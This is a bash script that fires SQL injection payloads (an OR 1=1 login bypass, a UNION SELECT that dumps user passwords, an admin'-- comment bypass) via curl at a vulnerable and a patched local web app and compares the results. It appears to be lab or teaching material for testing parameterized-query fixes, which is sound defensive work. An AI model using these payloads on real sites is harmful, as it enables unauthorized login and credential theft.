#!/bin/bash
# SQL Injection Testing Script using curl
# Usage: ./test_sqli.sh [vulnerable_url] [patched_url]

VULNERABLE_URL="${1:-http://localhost:5000}"
PATCHED_URL="${2:-http://localhost:5001}"

echo "========================================================================"
echo "SQL Injection Manual Test Script"
echo "========================================================================"
echo "Vulnerable App: $VULNERABLE_URL"
echo "Patched App: $PATCHED_URL"
echo ""

# Test 1: Authentication Bypass
echo "========================================================================"
echo "TEST 1: Authentication Bypass with ' OR '1'='1"
echo "========================================================================"

echo ""
echo "Testing VULNERABLE app:"
response=$(curl -s -c /tmp/cookies_vuln.txt -L -w "%{http_code}" -o /tmp/response_vuln.html \
  -X POST "$VULNERABLE_URL/login" \
  -d "username=' OR '1'='1&password=anything")

if [[ "$response" == "302" ]] || grep -q "Welcome" /tmp/response_vuln.html 2>/dev/null; then
    echo "✓ SUCCESS: Login bypass worked! (Response: $response)"
else
    echo "✗ BLOCKED: Attack was blocked (Response: $response)"
fi

echo ""
echo "Testing PATCHED app:"
response=$(curl -s -c /tmp/cookies_patched.txt -L -w "%{http_code}" -o /tmp/response_patched.html \
  -X POST "$PATCHED_URL/login" \
  -d "username=' OR '1'='1&password=anything")

if [[ "$response" == "302" ]] || grep -q "Welcome" /tmp/response_patched.html 2>/dev/null; then
    echo "✗ VULNERABLE: Login bypass worked! (Response: $response)"
else
    echo "✓ SECURE: Attack was blocked (Response: $response)"
fi

# Test 2: UNION-based SQLi
echo ""
echo "========================================================================"
echo "TEST 2: UNION SELECT Data Exfiltration"
echo "========================================================================"

# First, login as alice to test search
echo ""
echo "Logging in as alice..."
curl -s -c /tmp/cookies_alice_vuln.txt \
  -X POST "$VULNERABLE_URL/login" \
  -d "username=alice&password=password123" > /dev/null

curl -s -c /tmp/cookies_alice_patched.txt \
  -X POST "$PATCHED_URL/login" \
  -d "username=alice&password=password123" > /dev/null

echo ""
echo "Testing VULNERABLE app with UNION SELECT:"
curl -s -b /tmp/cookies_alice_vuln.txt \
  "$VULNERABLE_URL/search?query=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%20email%20FROM%20users%20--" \
  -o /tmp/search_vuln.html

if grep -q "admin_secret" /tmp/search_vuln.html 2>/dev/null || grep -q "password123" /tmp/search_vuln.html; then
    echo "✓ SUCCESS: Data exfiltration worked! Admin password exposed!"
else
    echo "✗ BLOCKED: UNION SELECT was blocked"
fi

echo ""
echo "Testing PATCHED app with UNION SELECT:"
curl -s -b /tmp/cookies_alice_patched.txt \
  "$PATCHED_URL/search?query=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%20email%20FROM%20users%20--" \
  -o /tmp/search_patched.html

if grep -q "admin_secret" /tmp/search_patched.html 2>/dev/null || grep -q "password123" /tmp/search_patched.html; then
    echo "✗ VULNERABLE: Data exfiltration worked!"
else
    echo "✓ SECURE: UNION SELECT was blocked"
fi

# Test 3: Comment-based bypass
echo ""
echo "========================================================================"
echo "TEST 3: Comment-based Password Bypass (admin'--)"
echo "========================================================================"

echo ""
echo "Testing VULNERABLE app:"
response=$(curl -s -L -w "%{http_code}" -o /tmp/comment_vuln.html \
  -X POST "$VULNERABLE_URL/login" \
  -d "username=admin'--&password=wrong_password")

if [[ "$response" == "302" ]] || grep -q "Welcome" /tmp/comment_vuln.html 2>/dev/null; then
    echo "✓ SUCCESS: Comment bypass worked!"
else
    echo "✗ BLOCKED: Attack was blocked"
fi

echo ""
echo "Testing PATCHED app:"
response=$(curl -s -L -w "%{http_code}" -o /tmp/comment_patched.html \
  -X POST "$PATCHED_URL/login" \
  -d "username=admin'--&password=wrong_password")

if [[ "$response" == "302" ]] || grep -q "Welcome" /tmp/comment_patched.html 2>/dev/null; then
    echo "✗ VULNERABLE: Comment bypass worked!"
else
    echo "✓ SECURE: Attack was blocked"
fi

# Cleanup
rm -f /tmp/cookies_*.txt /tmp/response_*.html /tmp/search_*.html /tmp/comment_*.html

echo ""
echo "========================================================================"
echo "Testing Complete!"
echo "========================================================================"
echo "Summary:"
echo "- Vulnerable app should allow all SQLi attacks"
echo "- Patched app should block all SQLi attacks with parameterized queries"
echo "========================================================================"
